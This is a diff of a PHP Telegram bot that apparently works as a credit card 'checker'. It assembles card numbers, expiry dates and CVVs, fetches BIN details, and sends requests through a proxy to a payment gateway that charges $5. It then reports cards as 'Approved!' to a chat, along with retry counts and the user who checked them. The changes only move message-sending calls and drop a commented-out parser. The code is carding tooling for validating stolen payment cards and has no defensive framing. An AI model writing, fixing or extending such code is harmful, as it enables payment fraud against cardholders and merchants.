@@ -18,7 +18,6 @@ $ma = "$mes/$ano1";
 $card = "$cc$mes$ano$cvv";
 $num = "$cc$mes$ano1$cvv";
 //-----------------------------------------------------//
-sendMessage($chatId, $lista, "HTML");  // Enviar el mensaje
 
 
 
@@ -42,8 +41,8 @@ if (!is_numeric($cc) || strlen($cc) != 16 || !is_numeric($mes) || !is_numeric($a
 */
 
 //----------------MENSAGE DE ESPERA-------------------//
-$respuesta = "<b>🕒 Wait for Result...</b>";
-sendMessage($chatId, $respuesta, $message_id, "HTML");  // Enviar el mensaje
+$response = "<b>🕒 Wait for Result...</b>";
+sendMessage($chatId, $response, $message_id, "HTML");  // Enviar el mensaje
 //-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
 $id_text = file_get_contents("ID");
 //----------------------------------------------------//
@@ -52,7 +51,7 @@ $id_text = file_get_contents("ID");
 $startTime = microtime(true); //TIEMPO DE INICIO
 $BinData = BinData($bin); //Extrae los datos del bin
 
-
+sendMessage($chatId, $BinData, "HTML");  // Enviar el mensaje
 
 //RANDOM USER//
 $ch = curl_init();
@@ -138,18 +137,6 @@ curl_setopt_array($curl, [
 $response = curl_exec($curl);
 $err = curl_error($curl);
 $json = json_decode($response, true);
-/*
-$respo = $json["status"];
-if (empty($respo)){
-$respo = explode(';', $json['message'])[0];
-}
-
-if (empty($respo)){
-$mensaje = preg_match('/<p>(.*?)<\/p>/', $response, $matches);
-$respo = $matches[1];
-} else {
-$respo = "Service Unavailable";
-}*/
 
 $respo = '';
 
@@ -190,6 +177,8 @@ unlink('cookie.txt');
 
 $retri = handleComando($card); //Checa cuntas veces se calo la misma ccs//
 
+sendMessage($chatId, $respo, "HTML");  // Enviar el mensaje
+	
 if (array_in_string($respo, $live_array)) {
     $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Approved! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐑𝐞𝐭𝐫𝐢𝐞𝐬: ".$retri."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
     $live = True;
